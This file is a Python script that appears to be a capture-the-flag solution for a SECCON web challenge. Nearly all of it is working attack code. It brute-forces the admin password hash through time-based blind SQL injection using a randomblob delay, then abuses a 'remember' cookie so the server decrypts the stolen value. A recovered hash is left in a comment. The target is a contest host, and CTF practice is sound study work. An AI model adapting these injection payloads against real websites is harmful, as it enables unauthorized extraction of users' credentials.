import requests
from time import time
import itertools
from bs4 import BeautifulSoup as bs4


def get_password_decrypted(password):
    url = "http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi"
    data = {"user":"","pass":"test","login":"Login"}
    cookie = {'remember': password}
    r = requests.post(url, data=data,cookies=cookie)
    html_bytes = r.text
    soup = bs4(html_bytes, 'lxml')
    password_dec = soup.find('input', {'name':'user'})['value']
    return password_dec
    
def send_payload(payload):
    url = "http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi"
    data = {"user":payload,"pass":"admin","login":"Login","save":"1"}
    s = time()
    r = requests.post(url, data=data)
    e = time()
    if e-s > 1.30:
        return True
    else:
        return False

password = ""
while True:
    payload = "admin' and password like '"
    payload1 = "%' and 1=randomblob(100000000)--"
    for i in "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_!":
        payload_send = payload + password + i + payload1
        flag = send_payload(payload_send)
        if flag == True:
            password+=i
            break
    print password
    if len(password) == 32:
        break

'''password : d2f37e101c0e76bcc90b5634a5510f64'''
print "Password admin decrypted : ",get_password_decrypted(password)
        
        
